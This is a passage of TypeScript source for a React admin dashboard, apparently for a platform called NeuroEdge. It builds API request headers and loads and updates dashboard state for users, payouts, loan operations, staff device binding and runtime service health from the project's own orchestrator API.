        userEmail = userEmail || String(parsed?.email || "");
        userName = userName || String(parsed?.name || "");
        userRole = userRole || String(parsed?.role || "");
      }
    } catch {
      // ignore localStorage parsing issues and fallback to env defaults
    }
    return {
      token: envToken || userToken || sessionToken,
      apiKey: envApiKey,
      orgId: userOrg || envOrg || "personal",
      workspaceId: userWorkspace || envWorkspace || "default",
      userEmail,
      userName,
      userRole,
      deviceId,
    };
  };

  const apiBase = String(import.meta.env.VITE_ORCHESTRATOR_URL || "http://localhost:7070");
  const headers = () => {
    const auth = authContext();
    const effectiveRole = String(
      auth.userRole || dashboardRole || (isFounderUser() ? "founder" : "user")
    ).toLowerCase();
    const h: Record<string, string> = {
      "Content-Type": "application/json",
      "x-org-id": auth.orgId,
      "x-workspace-id": auth.workspaceId,
    };
    if (auth.userEmail) h["x-user-email"] = auth.userEmail;
    if (auth.userName) h["x-user-name"] = auth.userName;
    if (effectiveRole) h["x-user-role"] = effectiveRole;
    if (auth.deviceId) h["x-device-id"] = auth.deviceId;
    if (auth.token) h.Authorization = `Bearer ${auth.token}`;
    if (auth.apiKey) {
      h["x-api-key"] = auth.apiKey;
      if (!h.Authorization) h.Authorization = `Bearer ${auth.apiKey}`;
    }
    return h;
  };

  const getJson = async (path: string) => {
    const res = await fetch(`${apiBase}${path}`, { headers: headers() });
    if (!res.ok) throw new Error(await res.text());
    return res.json();
  };
  const postJson = async (path: string, body: unknown) => {
    const res = await fetch(`${apiBase}${path}`, {
      method: "POST",
      headers: headers(),
      body: JSON.stringify(body),
    });
    const data = await res.json().catch(() => ({}));
    if (!res.ok) throw new Error(data?.error || data?.message || `HTTP ${res.status}`);
    return data;
  };

  const applyRemoteDashboard = (remote: any) => {
    if (!remote || typeof remote !== "object") return;
    if (Array.isArray(remote.users)) setUsers(remote.users);
    if (Array.isArray(remote.offers)) setOffers(remote.offers);
    if (Array.isArray(remote.plans)) setPlans(remote.plans);
    if (remote.payment && typeof remote.payment === "object") setPayment(remote.payment);
    if (remote.cryptoRewards && typeof remote.cryptoRewards === "object") setCryptoRewards(remote.cryptoRewards);
    if (remote.modelControl && typeof remote.modelControl === "object") setModelControl(remote.modelControl);
    if (remote.rewardsLedger && typeof remote.rewardsLedger === "object") setRewardsLedger(remote.rewardsLedger);
    if (remote.idverse && typeof remote.idverse === "object") {
      setIdverseConfig((prev) => ({
        ...prev,
        ...remote.idverse,
      }));
    }
    if (remote.featureFlags && typeof remote.featureFlags === "object") setFeatureFlags(remote.featureFlags);
    if (Array.isArray(remote.supportTickets)) setSupportTickets(remote.supportTickets);
    if (Array.isArray(remote.devApiKeys)) setDevApiKeys(remote.devApiKeys);
    if (Array.isArray(remote.webhooks)) setWebhooks(remote.webhooks);
    if (Array.isArray(remote.integrations)) setIntegrations(remote.integrations);
    if (Array.isArray(remote.domainLinks)) setDomainLinks(remote.domainLinks);
    if (remote.accessControl && typeof remote.accessControl === "object") setAccessControl(remote.accessControl);
    if (Array.isArray(remote.permissionCatalog)) setPermissionCatalog(remote.permissionCatalog);
    if (remote.deviceProtection && typeof remote.deviceProtection === "object") setDeviceProtection(remote.deviceProtection);
    if (remote.computeDonation && typeof remote.computeDonation === "object") {
      const cd = remote.computeDonation as any;
      if (cd.payoutBudget) setComputePayoutBudget((p) => ({ ...p, ...cd.payoutBudget }));
      if (Array.isArray(cd.payoutRequests)) setComputePayoutRequestsAdmin(cd.payoutRequests);
      if (cd.autoPayoutConfig && typeof cd.autoPayoutConfig === "object") {
        setComputeAutoPayoutConfig((p) => ({ ...p, ...cd.autoPayoutConfig }));
      }
      if (cd.resourceGuardrails && typeof cd.resourceGuardrails === "object") {
        setOwnerGuardrails((p) => ({ ...p, ...cd.resourceGuardrails }));
      }
    }
    if (remote.loanOps && typeof remote.loanOps === "object") {
      if (Array.isArray(remote.loanOps.companies)) setLoanOpsCompanies(remote.loanOps.companies);
      if (Array.isArray(remote.loanOps.devices)) setLoanOpsDevices(remote.loanOps.devices);
      if (Array.isArray(remote.loanOps.apiKeys)) setLoanOpsApiKeys(remote.loanOps.apiKeys);
      if (Array.isArray(remote.loanOps.intakeLogs)) setLoanOpsIntakeLogs(remote.loanOps.intakeLogs);
      if (Array.isArray(remote.loanOps.disputes)) setLoanOpsDisputes(remote.loanOps.disputes);
      if (remote.loanOps.policy && typeof remote.loanOps.policy === "object") {
        setLoanOpsPolicy((p) => ({
          ...p,
          ...remote.loanOps.policy,
          allowedAttestationProvidersCsv: Array.isArray(remote.loanOps.policy.allowedAttestationProviders)
            ? remote.loanOps.policy.allowedAttestationProviders.join(",")
            : p.allowedAttestationProvidersCsv,
        }));
      }
    }
    if (remote.userProtection && typeof remote.userProtection === "object") {
      if (Array.isArray(remote.userProtection.profiles) && remote.userProtection.profiles[0]) {
        setUserProtectionProfile(remote.userProtection.profiles[0]);
      }
      if (Array.isArray(remote.userProtection.incidents)) setUserProtectionIncidents(remote.userProtection.incidents);
      if (remote.userProtection.policy && typeof remote.userProtection.policy === "object") {
        setUserProtectionPolicy(remote.userProtection.policy);
      }
    }
    if (Array.isArray(remote.agentsLocal)) setAgentsLocal(remote.agentsLocal);
    if (Array.isArray(remote.savedPrompts)) setSavedPrompts(remote.savedPrompts);
    if (Array.isArray(remote.enterpriseDepartments)) setEnterpriseDepartments(remote.enterpriseDepartments);
    if (remote.ssoConfig && typeof remote.ssoConfig === "object") setSsoConfig(remote.ssoConfig);
    if (remote.neuroExpansion && typeof remote.neuroExpansion === "object") setNeuroExpansion(remote.neuroExpansion);
  };

  const callAction = async (path: string, body: any) => {
    try {
      const isGet = path.startsWith("GET:");
      const target = isGet ? path.replace("GET:", "") : path;
      const data = isGet ? await getJson(target) : await postJson(target, body);
      if (Array.isArray(data.users)) setUsers(data.users);
      if (Array.isArray(data.offers)) setOffers(data.offers);
      if (Array.isArray(data.plans)) setPlans(data.plans);
      if (data.payment) setPayment(data.payment);
      if (data.cryptoRewards) setCryptoRewards(data.cryptoRewards);
      if (data.modelControl) setModelControl(data.modelControl);
      if (data.rewardsLedger) setRewardsLedger(data.rewardsLedger);
      if (data.idverse) {
        setIdverseConfig((prev) => ({
          ...prev,
          ...data.idverse,
          apiKey: prev.apiKey,
        }));
      }
      if (data.featureFlags) setFeatureFlags(data.featureFlags);
      if (Array.isArray(data.supportTickets)) setSupportTickets(data.supportTickets);
      if (Array.isArray(data.devApiKeys)) setDevApiKeys(data.devApiKeys);
      if (Array.isArray(data.webhooks)) setWebhooks(data.webhooks);
      if (Array.isArray(data.integrations)) setIntegrations(data.integrations);
      if (Array.isArray(data.domainLinks)) setDomainLinks(data.domainLinks);
      if (data?.summary && data?.summary?.windowHours && data?.summary?.hallucinationRiskScore !== undefined) {
        setQualityTrust(data.summary);
      }
      if (data?.summary && data?.summary?.windowHours && data?.summary?.researchRuns !== undefined) {
        setQualityRetrieval(data.summary);
      }
      if (data?.snapshot && data?.snapshot?.windowHours) {
        setQualityReliability(data.snapshot);
      }
      if (data?.coverage && typeof data.coverage === "object") {
        setQualityEvalCoverage(data.coverage);
      }
      if (data?.router || data?.outcomes) {
        setQualityModelSummary({
          router: data.router || {},
          outcomes: data.outcomes || {},
        });
      }
      if (Array.isArray(data?.baselines)) {
        setBenchmarkBaselinesDraft(JSON.stringify(data.baselines, null, 2));
      }
      if (data?.config?.variants && Array.isArray(data.config.variants)) {
        setModelRouterDraft(JSON.stringify(data.config.variants, null, 2));
      }
      if (
        data?.config &&
        typeof data.config === "object" &&
        Object.prototype.hasOwnProperty.call(data.config, "verifiedAnswerMode")
      ) {
        setMarketReadinessConfig((prev) => ({ ...prev, ...data.config }));
      }
      if (data?.summary && typeof data.summary === "object" && data.summary?.config?.verifiedAnswerMode !== undefined) {
        setMarketReadinessSummary(data.summary);
        setMarketReadinessConfig((prev) => ({ ...prev, ...(data.summary.config || {}) }));
      }
      if (data?.program && typeof data.program === "object" && !Array.isArray(data.program?.items)) {
        setReliabilityProgram(data.program);
      }
      if (data?.slo && typeof data.slo === "object") {
        setReliabilityProgram((prev) => ({ ...(prev || {}), slo: data.slo }));
      }
      if (data?.canary && typeof data.canary === "object") {
        setReliabilityProgram((prev) => ({ ...(prev || {}), canary: data.canary }));
      }
      if (data?.statusPage && typeof data.statusPage === "object") {
        setReliabilityProgram((prev) => ({ ...(prev || {}), statusPage: data.statusPage }));
      }
      if (data?.incident && typeof data.incident === "object") {
        setReliabilityProgram((prev) => ({
          ...(prev || {}),
          incidents: [data.incident, ...((prev?.incidents || []) as any[])].slice(0, 200),
        }));
      }
      if (data?.program && Array.isArray(data.program.items) && Array.isArray(data.program.milestones)) {
        setFrontierProgram(data.program);
      }
      if (data?.readiness && typeof data.readiness === "object") {
        setFrontierReadiness(data.readiness);
      }
      if (data.accessControl && typeof data.accessControl === "object") setAccessControl(data.accessControl);
      if (Array.isArray(data.permissionCatalog)) setPermissionCatalog(data.permissionCatalog);
      if (data.deviceProtection && typeof data.deviceProtection === "object") setDeviceProtection(data.deviceProtection);
      if (typeof data.apiKey === "string" && data.apiKey) setLatestGeneratedApiKey(data.apiKey);
      if (Array.isArray(data?.devices)) setOwnerComputeDevices(data.devices);
      if (data?.payoutProfile && typeof data.payoutProfile === "object") setOwnerPayoutProfile(data.payoutProfile);
      if (Array.isArray(data?.payoutRequests)) setOwnerPayoutRequests(data.payoutRequests);
      if (data?.wallet && typeof data.wallet === "object") setOwnerWallet(data.wallet);
      if (data?.guardrails && typeof data.guardrails === "object") {
        setOwnerGuardrails((p) => ({ ...p, ...data.guardrails }));
      }
      if (data?.payoutBudget && typeof data.payoutBudget === "object") setComputePayoutBudget((p) => ({ ...p, ...data.payoutBudget }));
      if (data?.computeDonation?.payoutBudget && typeof data.computeDonation.payoutBudget === "object") {
        setComputePayoutBudget((p) => ({ ...p, ...data.computeDonation.payoutBudget }));
      }
      if (Array.isArray(data?.computeDonation?.payoutRequests)) setComputePayoutRequestsAdmin(data.computeDonation.payoutRequests);
      if (data?.computeDonation?.autoPayoutConfig && typeof data.computeDonation.autoPayoutConfig === "object") {
        setComputeAutoPayoutConfig((p) => ({ ...p, ...data.computeDonation.autoPayoutConfig }));
      }
      if (data?.loanOps && typeof data.loanOps === "object") {
        if (Array.isArray(data.loanOps.companies)) setLoanOpsCompanies(data.loanOps.companies);
        if (Array.isArray(data.loanOps.devices)) setLoanOpsDevices(data.loanOps.devices);
        if (Array.isArray(data.loanOps.apiKeys)) setLoanOpsApiKeys(data.loanOps.apiKeys);
        if (Array.isArray(data.loanOps.intakeLogs)) setLoanOpsIntakeLogs(data.loanOps.intakeLogs);
        if (Array.isArray(data.loanOps.disputes)) setLoanOpsDisputes(data.loanOps.disputes);
        if (data.loanOps.policy && typeof data.loanOps.policy === "object") {
          setLoanOpsPolicy((p) => ({
            ...p,
            ...data.loanOps.policy,
            allowedAttestationProvidersCsv: Array.isArray(data.loanOps.policy.allowedAttestationProviders)
              ? data.loanOps.policy.allowedAttestationProviders.join(",")
              : p.allowedAttestationProvidersCsv,
          }));
        }
      }
      if (data?.profile && data?.profile?.maxDevices !== undefined && data?.profile?.devices) {
        setUserProtectionProfile(data.profile);
      }
      if (Array.isArray(data?.incidents)) setUserProtectionIncidents(data.incidents);
      if (data?.policy && typeof data.policy === "object") setUserProtectionPolicy(data.policy);
      if (Array.isArray(data.agentsLocal)) setAgentsLocal(data.agentsLocal);
      if (Array.isArray(data.savedPrompts)) setSavedPrompts(data.savedPrompts);
      if (Array.isArray(data.enterpriseDepartments)) setEnterpriseDepartments(data.enterpriseDepartments);
      if (data.ssoConfig) setSsoConfig(data.ssoConfig);
      if (data?.neuroExpansion && typeof data.neuroExpansion === "object") {
        setNeuroExpansion(data.neuroExpansion);
      }
      if (data?.settings && data?.neuroExpansion) {
        const roots = Array.isArray(data.settings?.placeholderScanRoots)
          ? data.settings.placeholderScanRoots.join(",")
          : neuroExpansionSettingsDraft.placeholderScanRoots;
        setNeuroExpansionSettingsDraft({
          enabled: Boolean(data.settings?.enabled ?? neuroExpansionSettingsDraft.enabled),
          autoDailyScan: Boolean(data.settings?.autoDailyScan ?? neuroExpansionSettingsDraft.autoDailyScan),
          requireFounderApproval: Boolean(
            data.settings?.requireFounderApproval ?? neuroExpansionSettingsDraft.requireFounderApproval
          ),
          autoTestOnMerge: Boolean(data.settings?.autoTestOnMerge ?? neuroExpansionSettingsDraft.autoTestOnMerge),
          placeholderScanRoots: roots,
          maxFindings: String(data.settings?.maxFindings ?? neuroExpansionSettingsDraft.maxFindings),
        });
      }
      if (data?.report?.findings && Array.isArray(data.report.findings)) {
        setNeuroExpansionPlaceholderReport(data.report);
      }
      return data;
    } catch (err: any) {
      addNotification({ type: "error", message: err?.message || String(err) });
      return null;
    }
  };

  const runGuarded = async (title: string, fn: () => Promise<any>, actionLabel = "delete") => {
    if (!confirmSafeAction({ title, actionLabel })) return;
    const data = await fn();
    if (data) addNotification({ type: "warn", message: recoveryGuidance(title) });
  };

  useEffect(() => {
    const loadDashboardState = async () => {
      try {
        const data = await getJson("/admin/dashboard/bootstrap");
        applyRemoteDashboard(data?.dashboard || {});
      } catch {
        // fallback to local state
      }
      try {
        const access = await getJson("/admin/dashboard/access/bootstrap");
        if (Array.isArray(access?.permissionCatalog)) setPermissionCatalog(access.permissionCatalog);
        if (access?.accessControl && typeof access.accessControl === "object") setAccessControl(access.accessControl);
      } catch {
        // ignore when not authorized
      }
      try {
        const security = await getJson("/admin/device-protection/bootstrap");
        if (security?.deviceProtection && typeof security.deviceProtection === "object") {
          setDeviceProtection(security.deviceProtection);
        }
      } catch {
        // ignore when not authorized
      }
    };
    loadDashboardState();
    loadCreatorHistory();
    refreshQualityInsights();
    refreshFrontierProgram();
    loadRuntimeInventory();
    refreshMarketReadiness();
    refreshReliabilityProgram();
    refreshNeuroExpansion();
    (async () => {
      try {
        const owner = await getJson("/dashboard/compute-owner/bootstrap");
        if (Array.isArray(owner?.devices)) setOwnerComputeDevices(owner.devices);
        if (owner?.guardrails && typeof owner.guardrails === "object") {
          setOwnerGuardrails((p) => ({ ...p, ...owner.guardrails }));
        }
        if (owner?.payoutProfile) setOwnerPayoutProfile(owner.payoutProfile);
        if (Array.isArray(owner?.payoutRequests)) setOwnerPayoutRequests(owner.payoutRequests);
        if (owner?.wallet) setOwnerWallet(owner.wallet);
      } catch {
        // optional for roles/scopes
      }
      try {
        const admin = await getJson("/admin/dashboard/compute-payouts");
        if (admin?.payoutBudget) setComputePayoutBudget((p) => ({ ...p, ...admin.payoutBudget }));
        if (Array.isArray(admin?.payoutRequests)) setComputePayoutRequestsAdmin(admin.payoutRequests);
        if (admin?.autoPayoutConfig && typeof admin.autoPayoutConfig === "object") {
          setComputeAutoPayoutConfig((p) => ({ ...p, ...admin.autoPayoutConfig }));
        }
      } catch {
        // optional for founder/admin
      }
      if (canAccessLoanOps) {
        try {
          const lp = await getJson("/admin/loan-ops/bootstrap");
          if (lp?.loanOps) {
            if (Array.isArray(lp.loanOps.companies)) setLoanOpsCompanies(lp.loanOps.companies);
            if (Array.isArray(lp.loanOps.devices)) setLoanOpsDevices(lp.loanOps.devices);
            if (Array.isArray(lp.loanOps.apiKeys)) setLoanOpsApiKeys(lp.loanOps.apiKeys);
            if (Array.isArray(lp.loanOps.intakeLogs)) setLoanOpsIntakeLogs(lp.loanOps.intakeLogs);
            if (Array.isArray(lp.loanOps.disputes)) setLoanOpsDisputes(lp.loanOps.disputes);
            if (lp.loanOps.policy && typeof lp.loanOps.policy === "object") {
              setLoanOpsPolicy((p) => ({
                ...p,
                ...lp.loanOps.policy,
                allowedAttestationProvidersCsv: Array.isArray(lp.loanOps.policy.allowedAttestationProviders)
                  ? lp.loanOps.policy.allowedAttestationProviders.join(",")
                  : p.allowedAttestationProvidersCsv,
              }));
            }
          }
        } catch {
          // optional for authorized roles
        }
      }
      try {
        const up = await getJson("/dashboard/protection/bootstrap");
        if (up?.profile) setUserProtectionProfile(up.profile);
        if (Array.isArray(up?.incidents)) setUserProtectionIncidents(up.incidents);
        if (up?.policy) setUserProtectionPolicy(up.policy);
      } catch {
        // optional for authorized roles
      }
    })();
  }, []);

  useEffect(() => {
    const refresh = async () => {
      const nextServices: ServiceStatus[] = [];
      try {
        const orchestratorHealth = await getJson("/health");
        nextServices.push({
          name: "Orchestrator",
          status: orchestratorHealth?.status === "ok" ? "online" : "degraded",
          detail: orchestratorHealth?.status === "ok" ? "Serving API" : "Health degraded",
        });
      } catch {
        nextServices.push({ name: "Orchestrator", status: "offline", detail: "Not reachable" });
      }
      try {
        const sys = await getJson("/system/status");
        if (Array.isArray(sys?.services)) {
          sys.services.forEach((s: ServiceStatus) => nextServices.push(s));
        }
      } catch {
        // ignore
      }
      setServices(nextServices);

      const calls = await Promise.allSettled(
        [
          getJson("/kernels"),
          canAccessAdminOps ? getJson("/admin/usage") : Promise.resolve({ usage: {} }),
          canAccessAdminOps ? getJson("/admin/logs?limit=250") : Promise.resolve({ logs: [] }),
          canAccessAdminOps ? getJson("/admin/audit?limit=250") : Promise.resolve({ audit: [] }),
          canAccessAdminOps ? getJson("/admin/agents") : Promise.resolve({ agents: [] }),
          canAccessAdminOps ? getJson("/admin/version") : Promise.resolve({}),
          canAccessAdminOps ? getJson("/admin/system/metrics") : Promise.resolve({}),
        ]
      );
      if (calls[0].status === "fulfilled") {
        const ks: KernelSnapshot[] = Object.entries(calls[0].value || {}).map(([name, info]: [string, any]) => ({
          name,
          status: info?.status || "unknown",
          version: info?.version || "unknown",
        }));
        setKernels(ks);
      }
      if (calls[1].status === "fulfilled") setUsage(calls[1].value?.usage || {});
      if (calls[2].status === "fulfilled") setAdminLogs(calls[2].value?.logs || []);
      if (calls[3].status === "fulfilled") setAdminAudit(calls[3].value?.audit || []);
      if (calls[4].status === "fulfilled") setAdminAgents(calls[4].value?.agents || []);
      if (calls[5].status === "fulfilled") setAdminVersion(calls[5].value || {});
      if (calls[6].status === "fulfilled") setAdminMetrics(calls[6].value || {});
      refreshQualityInsights();
      refreshReliabilityProgram();
      refreshNeuroExpansion();
      try {
        const owner = await getJson("/dashboard/compute-owner/bootstrap");
        if (Array.isArray(owner?.devices)) setOwnerComputeDevices(owner.devices);
        if (owner?.guardrails && typeof owner.guardrails === "object") {
          setOwnerGuardrails((p) => ({ ...p, ...owner.guardrails }));
        }
        if (owner?.payoutProfile) setOwnerPayoutProfile(owner.payoutProfile);
        if (Array.isArray(owner?.payoutRequests)) setOwnerPayoutRequests(owner.payoutRequests);
        if (owner?.wallet) setOwnerWallet(owner.wallet);
      } catch {
        // optional
      }
      if (canAccessAdminOps) {
        try {
          const admin = await getJson("/admin/dashboard/compute-payouts");
          if (admin?.payoutBudget) setComputePayoutBudget((p) => ({ ...p, ...admin.payoutBudget }));
          if (Array.isArray(admin?.payoutRequests)) setComputePayoutRequestsAdmin(admin.payoutRequests);
          if (admin?.autoPayoutConfig && typeof admin.autoPayoutConfig === "object") {
            setComputeAutoPayoutConfig((p) => ({ ...p, ...admin.autoPayoutConfig }));
          }
        } catch {
          // optional
        }
      }
      if (canAccessLoanOps) {
        try {
          const lp = await getJson("/admin/loan-ops/bootstrap");
          if (lp?.loanOps) {
            if (Array.isArray(lp.loanOps.companies)) setLoanOpsCompanies(lp.loanOps.companies);
            if (Array.isArray(lp.loanOps.devices)) setLoanOpsDevices(lp.loanOps.devices);
            if (Array.isArray(lp.loanOps.apiKeys)) setLoanOpsApiKeys(lp.loanOps.apiKeys);
            if (Array.isArray(lp.loanOps.intakeLogs)) setLoanOpsIntakeLogs(lp.loanOps.intakeLogs);
            if (Array.isArray(lp.loanOps.disputes)) setLoanOpsDisputes(lp.loanOps.disputes);
            if (lp.loanOps.policy && typeof lp.loanOps.policy === "object") {
              setLoanOpsPolicy((p) => ({
                ...p,
                ...lp.loanOps.policy,
                allowedAttestationProvidersCsv: Array.isArray(lp.loanOps.policy.allowedAttestationProviders)
                  ? lp.loanOps.policy.allowedAttestationProviders.join(",")
                  : p.allowedAttestationProvidersCsv,
              }));
            }
          }
        } catch {
          // optional
        }
      }
      try {
        const up = await getJson("/dashboard/protection/bootstrap");
        if (up?.profile) setUserProtectionProfile(up.profile);
        if (Array.isArray(up?.incidents)) setUserProtectionIncidents(up.incidents);
        if (up?.policy) setUserProtectionPolicy(up.policy);
      } catch {
        // optional
      }
    };
    refresh();
    const t = setInterval(refresh, 15000);
    return () => clearInterval(t);
  }, [canAccessAdminOps, canAccessLoanOps]);

  useEffect(() => {
    if (!canAccessAdminOps) return;
    (async () => {
      try {
        const data = await getJson("/admin/training/bootstrap-pack/auto-refresh/status");
        if (data?.config) {
          setAutoRefreshEnabled(Boolean(data.config.enabled));
          setAutoRefreshHourUtc(String(data.config.hourUtc ?? "2"));
          setAutoRefreshMinuteUtc(String(data.config.minuteUtc ?? "10"));
          setAutoRefreshStaleHours(String(data.config.staleHours ?? "36"));
        }
      } catch {
        // ignore if not authorized
      }
    })();
  }, [canAccessAdminOps]);

  useEffect(() => {
    if (!canAccessAdminOps) return;
    loadRuntimeInventory();
    const t = setInterval(() => {
      loadRuntimeInventory();
    }, 120000);
    return () => clearInterval(t);
  }, [canAccessAdminOps]);

  const localMsgStats = useMemo(() => {
    const all = chatContext.getAll();
    return {
      total: all.length,
      errors: all.filter((m) => m.role === "assistant" && String(m.content || "").startsWith("❌")).length,
      warnings: all.filter((m) => m.role === "assistant" && String(m.content || "").startsWith("⚠️")).length,
    };
  }, []);

  const conversationStats = useMemo(() => {
    const all = listConversations();
    return {
      chats: all.length,
      messages: all.reduce((acc, c) => acc + c.messages.length, 0),
      latest: all[0]?.title || "No chats yet",
    };
  }, []);

  const tokenTotal = Number(usage?.totals?.totalTokens || 0);
  const reqTotal = Number(usage?.totals?.requests || 0);
  const estRevenue = Number(((tokenTotal / 1_000_000) * 8.5).toFixed(2));
  const securityAlerts = adminAudit.filter((a) =>
    String(a?.type || "").startsWith("doctrine.") || String(a?.type || "").startsWith("policy.")
  );

  const runtimeServiceState = useMemo(() => {
    const findStatus = (needle: string) =>
      services.find((s) => s.name.toLowerCase().includes(needle))?.status || "offline";
    return {
      kernel: (findStatus("kernel") as "online" | "offline" | "degraded"),
      ml: (findStatus("ml") as "online" | "offline" | "degraded"),
      orchestrator: (findStatus("orchestrator") as "online" | "offline" | "degraded"),
      frontend: "online" as "online",
    };
  }, [services]);

  const extractRuntimeFiles = (files: string[], domain: RuntimeDomain) => {
    const extAllowed =
      domain === "kernel"
        ? /\.(go)$/i
        : domain === "ml"
        ? /\.(py)$/i
        : /\.(ts|tsx|js|jsx)$/i;
    const runtimePattern =
      domain === "frontend"
        ? /^src\/(components|services|pages|extensions|stores)\//i
        : /(agent|engine|worker|runner|router|manager|service|bridge|handler|inference|mesh|federated|twin|training|kernel|orchestrator)/i;
    return files
      .filter((f) => extAllowed.test(f))
      .filter((f) => runtimePattern.test(f))
      .slice(0, 240);
  };

  const logHintFor = (domain: RuntimeDomain, key: string) => {
    const needle = key.toLowerCase();
    const hit = adminLogs.find((l) => {
      const text = `${String(l?.type || "")} ${String(l?.message || "")} ${JSON.stringify(l?.payload || {})}`.toLowerCase();
      const isErr = text.includes("error") || text.includes("fail") || text.includes("panic") || text.includes("exception");
      return isErr && (text.includes(domain) || (needle && text.includes(needle)));
    });
    return hit ? String(hit?.message || hit?.type || "runtime error") : "";
  };

  const runtimeUnits = useMemo(() => {
    const scan = runtimeTwinScan?.structure || {};
    const backend = scan?.backend || {};
    const kernelFiles = Array.isArray(backend?.kernel?.files) ? backend.kernel.files : [];
    const mlFiles = Array.isArray(backend?.ml?.files) ? backend.ml.files : [];
    const orchFiles = Array.isArray(backend?.orchestrator?.files) ? backend.orchestrator.files : [];
    const frontendFiles = Array.isArray(scan?.frontend?.files) ? scan.frontend.files : [];

    const buildFromFiles = (domain: RuntimeDomain, files: string[], kind: RuntimeUnit["kind"]) => {
      const onlineState = runtimeServiceState[domain];
      return extractRuntimeFiles(files, domain).map((path, idx) => {
        const base = path.split("/").pop() || path;
        const hint = logHintFor(domain, base);
        const live = onlineState === "offline" ? false : hint ? false : true;
        return {
          id: `${domain}-file-${idx}-${base}`,
          name: base,
          domain,
          kind,
          registered: true,
          live,
          cause:
            onlineState === "offline"
              ? `${domain} service not reachable`
              : hint || "healthy",
          suggestedFix:
            domain === "kernel"
              ? "Inspect kernel logs and /kernels state, then restart kernel if needed."
              : domain === "ml"
              ? "Inspect ML /ready and inference logs, then restart ML if needed."
              : domain === "orchestrator"
              ? "Inspect orchestrator /status + logs and clear failing handlers."
              : "Inspect browser console + rebuild frontend modules.",
          sourcePath: path,
        } as RuntimeUnit;
      });
    };

    const kernelInstances: RuntimeUnit[] = kernels.map((k) => {
      const st = String(k.status || "").toLowerCase();
      const live = st === "ready" || st === "online" || st === "running";
      return {
        id: `kernel-instance-${k.name}`,
        name: k.name,
        domain: "kernel",
        kind: "instance",
        registered: true,
        live,
        cause: live ? "healthy" : `kernel instance status=${k.status}`,
        suggestedFix: "Check kernel health and restart this kernel instance.",
      };
    });

    const orchestratorAgents: RuntimeUnit[] = (runtimeAgentRegistry || []).map((a, i) => {
      const live = String(a.status || "").toLowerCase() === "running";
      return {
        id: `orchestrator-agent-${i}-${a.name}`,
        name: a.name,
        domain: "orchestrator",
        kind: "agent",
        registered: true,
        live,
        cause: live ? "healthy" : `agent status=${a.status}`,
        suggestedFix: "Inspect agent logs and restart orchestrator/agent manager.",
      };
    });

    const kernelUnits = [...kernelInstances, ...buildFromFiles("kernel", kernelFiles, "file")];
    const mlUnits = buildFromFiles("ml", mlFiles, "engine");
    const orchestratorUnits = [...orchestratorAgents, ...buildFromFiles("orchestrator", orchFiles, "engine")];
    const frontendUnits = buildFromFiles("frontend", frontendFiles, "module");

    const uniq = (arr: RuntimeUnit[]) => {
      const seen = new Set<string>();
      return arr.filter((u) => {
        const key = `${u.domain}:${u.name}:${u.kind}`;
        if (seen.has(key)) return false;
        seen.add(key);
        return true;
      });
    };

    return {
      kernel: uniq(kernelUnits),
      ml: uniq(mlUnits),
      orchestrator: uniq(orchestratorUnits),
      frontend: uniq(frontendUnits),
    } as Record<RuntimeDomain, RuntimeUnit[]>;
  }, [runtimeTwinScan, runtimeServiceState, adminLogs, kernels, runtimeAgentRegistry]);

  const runtimeCounts = useMemo(
    () => ({
      kernel: runtimeUnits.kernel.length,
      ml: runtimeUnits.ml.length,
      orchestrator: runtimeUnits.orchestrator.length,
      frontend: runtimeUnits.frontend.length,
    }),
    [runtimeUnits]
  );

  const runtimeSummary = useMemo(() => {
    const units = runtimeUnits[runtimeDomain] || [];
    return {
      total: units.length,
      live: units.filter((u) => u.live).length,
      registered: units.filter((u) => u.registered).length,
      offline: units.filter((u) => !u.live).length,
    };
  }, [runtimeUnits, runtimeDomain]);

  const loadRuntimeInventory = async () => {
    if (!canAccessAdminOps) return;
    setRuntimeScanLoading(true);
    try {
      const [scanRes, agentsRes] = await Promise.all([
        callAction("/twin/scan", {}),
        getJson("/admin/agents").catch(() => null),
      ]);
      if (scanRes?.structure) {
        setRuntimeTwinScan(scanRes);
      }
      if (Array.isArray(agentsRes?.agents)) {
        setRuntimeAgentRegistry(agentsRes.agents);
      }
      setRuntimeScanAt(Date.now());
    } finally {
      setRuntimeScanLoading(false);
    }
  };

  const assignRole = async (id: string, role: UserRecord["role"]) => {
    await callAction("/admin/dashboard/users/role", { id, role });
    addNotification({ type: "success", message: `Role updated for ${id}` });
  };

  const localDeviceId = () => {
    let id = "";
    try {
      id = localStorage.getItem("neuroedge_device_id") || "";
      if (!id) {
        id = `dev-${Date.now()}-${Math.random().toString(36).slice(2, 10)}`;
        localStorage.setItem("neuroedge_device_id", id);
      }
    } catch {
      id = `dev-${Date.now()}`;
    }
    return id;
  };

  const registerStaffUser = async () => {
    const name = staffName.trim();
    const email = staffEmail.trim().toLowerCase();
    if (!name || !email) {
      addNotification({ type: "error", message: "Enter staff name and email." });
      return;
    }
    const deviceId = staffDeviceId.trim() || localDeviceId();
    const data = await callAction("/admin/dashboard/staff/register", {
      user: {
        name,
        email,
        role: staffRole,
        allowedDeviceId: deviceId,
      },
    });
    if (data?.success) {
      setStaffName("");
      setStaffEmail("");
      setStaffDeviceId("");
      addNotification({ type: "success", message: `${staffRole} account registered and device-bound.` });
    }
  };

  const bindStaffDevice = async (id: string, deviceId: string) => {
    const nextDevice = deviceId.trim() || localDeviceId();
    const data = await callAction("/admin/dashboard/staff/device/bind", { id, allowedDeviceId: nextDevice });
    if (data?.success) addNotification({ type: "success", message: `Device bound for ${id}` });
  };

  const setStaffAccess = async (id: string, action: "allow" | "suspend" | "revoke") => {
    const data = await callAction("/admin/dashboard/staff/access", { id, action });
    if (data?.success) addNotification({ type: "success", message: `Account ${id}: ${action}` });
  };

  const updateUserStatus = async (id: string, status: UserRecord["status"]) => {
    await callAction("/admin/dashboard/users/status", { id, status });
    addNotification({ type: "success", message: `Status updated for ${id}` });
  };

  const savePaymentDetails = async () => {
    const digits = paymentDraftCard.replace(/\D/g, "");
    if (digits.length < 12) {
      addNotification({ type: "error", message: "Enter a valid payment card number." });
      return;
    }
    const masked = `${"*".repeat(Math.max(0, digits.length - 4))}${digits.slice(-4)}`;
    const nextPayment = { ...payment, cardNumberMasked: masked };
    await callAction("/admin/dashboard/payment/save", { payment: nextPayment });
    setPaymentDraftCard("");
    addNotification({ type: "success", message: "Payment profile saved in dashboard settings." });
  };

  const addOffer = async () => {
    const pct = Number(newOfferPct);
    if (!newOfferName.trim() || !Number.isFinite(pct) || pct <= 0 || pct > 90) {
      addNotification({ type: "error", message: "Enter offer name and discount (1-90)." });
      return;
    }
    await callAction("/admin/dashboard/offers/upsert", {
      offer: {
        name: newOfferName.trim(),
        discountPct: pct,
        active: true,
